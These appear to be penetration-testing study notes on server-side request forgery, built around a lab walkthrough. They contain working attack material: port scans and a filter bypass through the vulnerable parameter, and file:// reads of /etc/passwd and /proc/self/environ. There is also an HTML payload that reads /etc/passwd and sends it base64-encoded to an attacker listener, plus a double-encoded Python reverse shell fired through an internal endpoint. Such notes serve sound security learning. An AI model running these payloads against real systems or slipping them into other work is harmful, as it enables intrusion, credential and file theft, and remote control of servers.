# SSRF

- Server Side Request Forgery - abuse server functionality to perform internal or external resource requests on behalf of the server
- need to modify or supply URLs used by the target application to read or submit data
- exploiting SSRF can lead to 
	- Interacting with known internal systems
	- Discovering internal services via port scans
	- Disclosing local/sensitive data
	- Including files in the target application
	- Leaking NetNTLM hashes using UNC Paths (Windows)
	- Achieving RCE

- usually find SSRF vulns in applications that fetch remote resources
- when hunting for SSRF vulns, we should look for
	- **Parts of HTTP requests, including URLs**
	- **File imports such as HTML, PDFs, images, etc**
	- **Remote server connections to fetch data**
	- **API specification imports**
	- **Dashboards including ping and similar functionalities to check server statuses**

- web application fuzzing should be any part of any penetration testing or bug bounty hunting activity
- fuzzing should not be limited to user input fields only 
- extend fuzzing to parts of the HTTP request as well such as User-Agent

---

# SSRF Exploitation Example

## Attack Scenario

1. scan with nmap and found 2 open ports
```sh
nmap -sT -T5 -min-rate=10000 -p- $IP
```

2. cURL request to the target server 
```sh
curl -i -s http://$IP
```

- suppose the request redirected to `/load?q=index.html`

3. cURL request to redirect
```sh
curl -i -s -L http://$IP
```

4. confirm that `q` parameter is vulnerable to SSRF
- suppose target has `external.app.local` and `internal.app.local` which cannot be accessible from external

- first make a Netcat listener at our machine
```sh
nc -nvlp 8080
```

- then issue a request to the target application with IP address that can interact with our listening netcat, in this case HTB VPN IP
```sh
curl -i -s "http://$TARGET_IP/load?q=http://$VPN_IP:8080"
```

- suppose we receive the following into our Netcat listener confirming the SSRF vulnerability via the request issued by the target server like this
```
Connection received on <TARGET IP> 49852
GET / HTTP/1.1
Accept-Encoding: identity
Host: <VPN/TUN Adapter IP>:8080
User-Agent: Python-urllib/3.8
Connection: close
```
- we are trying to read local files via the Python-urllib (file schema and reomte files using ftp)

5. Create server to interact

i) `index.html`
```html
<html><body><a>SSRF</a></body></html>
```

ii) start server with python
```sh
python -m http.server 9090
```

iii) Start a FTP server via 
```sh
pip install twisted
python -m twisted ftp -p 21 -r .
```

iv) Retrieve our index.html through the target application using the ftp scehma as follow

```sh
curl -i -s "http://$TARGET_IP/load?q=ftp://$VPN_IP/index.html"
```
- suppose we get
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 41
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 11:21:09 GMT

<html><body><a>SSRF</a></body></html>
```

v) Retrieve our index.html through the target application using the http schema as follow

```sh
curl -i -s "http://$TARGET_IP/load?q=http://$VPN_IP:9090/index.html"
```
- suppose we get the same respone above

vi) Retrieve application local file using the file schema as follow

```sh
curl -i -s "http://$TARGET_IP/load?q=file:///etc/passwd"
```

- Fetching remote HTML files can lead to Reflected XSS
- In this case we try with only 2 ports
- to find all possible ports

i) Generate a wordlist containing all possible ports

```sh
for port in {1..65535}; do echo $port >> ports; done
```

ii) cURL request to a random port to get the response size of a request for a non-existent service

```sh
curl -i -s "http://$TARGET_IP/load?q=http://127.0.0.1:1"
```
- suppose we get a response with content length 30; which is not a valid port

iii) use ffuf with the wordlist and discard the responses which have the size of 30

```sh
ffuf -w ports:PORT -u "http://$TARGET_IP/load?q=http://127.0.0.1:PORT" -fs 30
```
- then we'll able to find the open port

## Attacking the internal app with name

- Try to attack the `internal.app.local` web application through SSRF

i) cURL request to the internal application we discovered previously 

```sh
curl -i -s "http://$TARGET_IP/load?q=http://internal.app.local/load?q=index.html"
```

- suppose we get
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 83
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 13:51:15 GMT

<html>
<body>
<h1>Internal Web Application</h1>
<a>Hello World!</a>
</body>
</html>
```

ii) discover any web applications listening in localhost; try to issue a request to a random port to identify how responses from closed ports look

```sh
curl -i -s "http://$TARGET_IP/load?q=http://internal.app.local/?q=http://127.0.0.1:1"
```

- suppose we get
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 97
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:52:32 GMT

<html><body><h1>Resource: http127.0.0.1:1</h1><a>unknown url type: http127.0.0.1</a></body></html>
```
- the web application filtered `://` from out request
- to bypass this, try with 
```sh
curl -i -s "http://$TARGET_IP/load?q=http://internal.app.local/?q=http::////127.0.0.1:1"
```
- suppose we can bypass and get a response 
```
HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 99
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 14:55:10 GMT

<html><body><h1>Resource: http://127.0.0.1:1</h1><a>[Errno 111] Connection refused</a></body></html>
```

iii) with ffuf, fuzz all the ports with filtering error message

```sh
ffuf -w ports:PORT -u "http://$TARGET_IP/load?q=http://internal.app.local/load?q=http::////127.0.0.1:PORT" -fr 'Errno[[:blank:]]111'
```

iv) try to issue a request to disclose `/proc/self/environ` file where the current path should be present under `PWD` environment variable

```sh
curl -i -s "http://<TARGET IP>/load?q=http://internal.app.local/load?q=file:://///proc/self/environ" -o -
```

```

HTTP/1.0 200 OK
Content-Type: text/html; charset=utf-8
Content-Length: 584
Server: Werkzeug/2.0.2 Python/3.8.12
Date: Tue, 19 Oct 2021 16:52:20 GMT

<html><body><h1>Resource: file:///proc/self/environ</h1><a>HOSTNAME=18f236843662PYTHON_VERSION=3.8.12PWD=/appPORT=80PYTHON_SETUPTOOLS_VERSION=57.5.0HOME=/rootLANG=C.UTF-8GPG_KEY=E3FF2839C048B25C084DEBE9B26995E310250568SHLVL=0PYTHON_PIP_VERSION=21.2.4PYTHON_GET_PIP_SHA256=01249aa3e58ffb3e1686b7141b4e9aac4d398ef4ac3012ed9dff8dd9f685ffe0PYTHON_GET_PIP_URL=https://github.com/pypa/get-pip/raw/d781367b97acf0ece7e9e304bf281e99b618bf10/public/get-pip.pyPATH=/usr/local/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin_=/usr/local/bin/python3</a></body></html>
```

- now know that the current path is `/app` 

---

- urlencode with `jq`

```sh
echo "encode me" | jq -sRr @uri
```

---

# Blind SSRF

- could exist in PDF document generators and HTTP headers, and other lcoations

## Example Attack

- suppose a web application that receives an HTML file and returns PDF document
- if we upload a HTML file and it doesn't response related to the processing of the submitted HTML file on the front end

1. Create an HTML file containing a link to a service under our control (which may be web server or Burp Collaborator or something) to test if the application is vulnerable to a blind SSRF vulnerability
- Out-of-band techniques include HTTP, DNS, FTP

```html
<!DOCTYPE html>
<html>
<body>
	<a>Hello World</a>
	<img src="http://SERVICE_IP:PORT/x?=viaimgtag"/>
</body>
</html>
```

2. In this example, use netcat as a listener

```sh
sudo nc -nlvp 9090
```

3. Suppose we get a request to netcat with User-Agent - wkhtmltopdf service

- https://wkhtmltopdf.org/downloads.html

- we can execute JS in wkhtmltopdf with the following html payload

```html
<html>
<body>
	<b>Exfiltration via Blind SSRF</b>
	<script>
	var readfile = new XMLHttpRequest(); // to read local file
	var exfil = new XMLHttpRequest(); // to send file to ours
	readfile.open("GET", "file:///etc/passwd", true);
	readfile.send();
	readfile.onload = function() {
		if (readfile.readyState === 4) {
			var url = 'http://SERVICE_IP:PORT/?data=' + btoa(this.response);
			exfil.open("GET", url, true);
			exfil.send();
		}
	}
	readfile.onerror = function() {
		document.write('<a>Error!</a>');
	}
	</script>
</body>
</html>
```

4. We'll get file with base64 encoded version

```sh
echo OUR_RECEIVED_DATA_IN_NETCAT_data_query | base64 -d
```

## Example Attack 2

- suppose we exploited an internal app `internal.app.local` exists and python is installed on that app
- same server like in `questions/ssrf` file

### Bash reverse shell

```bash
export RHOST="<VPN/TUN IP>";export RPORT="<PORT>";python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
```

- in this internal server, we need to url encode twice

```
export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527
```

- create an HTML file that perform GET request to internal.app.local (that was vulnerable to RCE via SSRF and execute our reverse shell)

```html
<html>
    <body>
        <b>Reverse Shell via Blind SSRF</b>
        <script>
        var http = new XMLHttpRequest();
        http.open("GET","http://internal.app.local/load?q=http::////127.0.0.1:5000/runme?x=export%2520RHOST%253D%252210.10.14.221%2522%253Bexport%2520RPORT%253D%25229090%2522%253Bpython%2520-c%2520%2527import%2520sys%252Csocket%252Cos%252Cpty%253Bs%253Dsocket.socket%2528%2529%253Bs.connect%2528%2528os.getenv%2528%2522RHOST%2522%2529%252Cint%2528os.getenv%2528%2522RPORT%2522%2529%2529%2529%2529%253B%255Bos.dup2%2528s.fileno%2528%2529%252Cfd%2529%2520for%2520fd%2520in%2520%25280%252C1%252C2%2529%255D%253Bpty.spawn%2528%2522%252Fbin%252Fsh%2522%2529%2527", true); 
        http.send();
        http.onerror = function(){document.write('<a>Oops!</a>');}
        </script>
    </body>
</html>
```

---

# Time-Based SSRF

- suppose above application which serve to convert HTML document with the following payload

```html
<html>
<body>
	<b>Time-Based Blind SSRF</b>
	<img src="http://notexisturl.com"/>
</body>
</html>
```

- observe the response time 
- suppose it took 10 seconds
- submit with valid url and see the response

---